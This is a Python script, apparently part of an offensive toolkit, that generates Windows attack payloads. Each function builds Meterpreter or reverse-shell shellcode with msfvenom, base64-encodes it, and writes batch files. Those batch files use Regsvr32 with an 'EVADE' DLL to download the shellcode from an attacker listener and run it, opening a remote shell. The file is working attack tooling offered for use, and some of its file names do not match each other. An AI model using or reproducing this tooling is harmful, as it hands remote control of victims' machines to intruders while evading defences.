#! /usr/bin/env python3

import os
import importlib
from importlib import util

spec = importlib.util.find_spec('.subserv', package='lib')
m = spec.loader.load_module()



##  regsrv32 32 bit Meterpreter DLL EVADE
def gen_320():

  print(m.bcolors.GREEN + m.bcolors.BOLD + m.bcolors.UNDERLINE + "\tWe are generating the 32bit Meterpreter RegSrv32  Payloads NOW!" + m.bcolors.ENDC)
  print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating 320 32bit Base64 payload -------")
  os.system("msfvenom -p " + m.METRT32_Payload + " CMD=calc.exe LHOST=" + m.listener_ip + " LPORT=" + m.METRT32_PORT + " --platform win -a x86 EXITFUNC=thread -f raw 2>/dev/null  | base64 >" + m.targetfile + "320-MET32.b64")


  print(m.bcolors.BLUE + "\t[*]" + m.bcolors.ENDC + " Generating 32 bit Reg MET  BAT file...")
  metreg32_bat_file = open(m.targetfile + "321-Reg-Met-32.bat", "w")
  metreg32_bat_file.write("""cmd /k c:\Windows\System32\Regsvr32.exe /s /i:shellcode,http://%s/320-MET32.b64 322-WEV_x86.dll
""" % m.listener_ip)
  metreg32_bat_file.close()

  print("\tMoving files!!")
  os.system("cp ./src/WEV_x86.dll " + m.targetfile + "322-WEV_x86.dll")

##  regsrv32 64 bit Meterpreter DLL EVADE
def gen_330():

  print(m.bcolors.GREEN + m.bcolors.BOLD + m.bcolors.UNDERLINE + "\tWe are generating the 64bit Meterpreter RegSrv32  Payloads NOW!" + m.bcolors.ENDC)
  print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating 330 64bit Base64 payload -------")
  os.system("msfvenom -p " + m.METRT64_Payload + " CMD=calc.exe LHOST=" + m.listener_ip + " LPORT=" + m.METRT64_PORT + "  --platform win -a x64 EXITFUNC=thread -f raw 2>/dev/null | base64 >" + m.targetfile + "330-MET64.b64")


  print(m.bcolors.BLUE + "\t[*]" + m.bcolors.ENDC + " Generating 64 bit Reg MET  BAT file...")
  metreg64_bat_file = open(m.targetfile + "331-Reg-Met-64.bat", "w")
  metreg64_bat_file.write("""cmd /k c:\Windows\SysWoW64\Regsvr32.exe /s /i:shellcode,http://%s/330-MET64.b64 332-WEV_x64.dll
""" % m.listener_ip)
  metreg64_bat_file.close()

  print("\tMoving files!!")
  os.system("cp ./src/WEV_x64.dll " + m.targetfile + "332-WEV_x64.dll")


##  regsrv32 32 bit Shell DLL EVADE
def gen_340():

  print(m.bcolors.GREEN + m.bcolors.BOLD + m.bcolors.UNDERLINE + "\tWe are generating the 32bit SHELL RegSrv32  Payloads NOW!" + m.bcolors.ENDC)
  print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating 340 32bit Base64 payload -------")
  os.system("msfvenom -p " + m.SHELL32_Payload + " CMD=calc.exe LHOST=" + m.listener_ip + " LPORT=" + m.SHELL32_PORT + "  --platform win -a x86 EXITFUNC=thread  -f raw 2>/dev/null | base64 >" + m.targetfile + "340-SHELL32.b64")


  print(m.bcolors.BLUE + "\t[*]" + m.bcolors.ENDC + " Generating 32 bit Reg Shell BAT file...")
  shellreg32_bat_file = open(m.targetfile + "341-Reg-SHELL-32.bat", "w")
  shellreg32_bat_file.write("""cmd /k c:\Windows\System32\Regsvr32.exe /s /i:shellcode,http://%s/340-SHELL32.b64 322-WEV_x86.dll
""" % m.listener_ip)
  shellreg32_bat_file.close()

  print(m.bcolors.GREEN + m.bcolors.BOLD + m.bcolors.UNDERLINE + "\tWe are generating the 32bit DNS SHELL RegSrv32  Payloads NOW!" + m.bcolors.ENDC)
  print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating 340 32bit Base64 payload -------")
  os.system("msfvenom -p " + m.SHELLDNSWIN + " CMD=calc.exe LHOST=" + m.listener_ip + " LPORT=" + m.DNSPORT + "  --platform win -a x86 EXITFUNC=thread  -f raw 2>/dev/null | base64 >" + m.targetfile + "342-m.SHELL32.b64")


  print(m.bcolors.BLUE + "\t[*]" + m.bcolors.ENDC + " Generating 32 bit Reg Shell BAT file...")
  shelreg32_bat_file = open(m.targetfile + "343-Reg-DNS-32.bat", "w")
  shelreg32_bat_file.write("""cmd /k c:\Windows\System32\Regsvr32.exe /s /i:shellcode,http://%s/342-DNS32.b64 322-WEV_x86.dll
""" % m.listener_ip)
  shelreg32_bat_file.close()


##  regsrv32 64 bit Shell DLL EVADE
def gen_350():

  print(m.bcolors.GREEN + m.bcolors.BOLD + m.bcolors.UNDERLINE + "\tWe are generating the 64bit SHELL RegSrv32  Payloads NOW!" + m.bcolors.ENDC)
  print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating 350 64bit Base64 payload -------")
  os.system("msfvenom -p " + m.SHELL64_Payload + " CMD=calc.exe LHOST=" + m.listener_ip + " LPORT=" + m.SHELL64_PORT + "  --platform win -a x64 EXITFUNC=thread -f raw 2>/dev/null | base64 >" + m.targetfile + "350-SHELL64.b64")


  print(m.bcolors.BLUE + "\t[*]" + m.bcolors.ENDC + " Generating 64 bit RegSrv32 Shell  BAT file...")
  shellreg64_bat_file = open(m.targetfile + "351-Reg-Met-64.bat", "w")
  shellreg64_bat_file.write("""cmd /k c:\Windows\SysWoW64\Regsvr32.exe /s /i:shellcode,http://%s/350-SHELL64.b64 332-WEV_x64.dll
""" % m.listener_ip)
  shellreg64_bat_file.close()
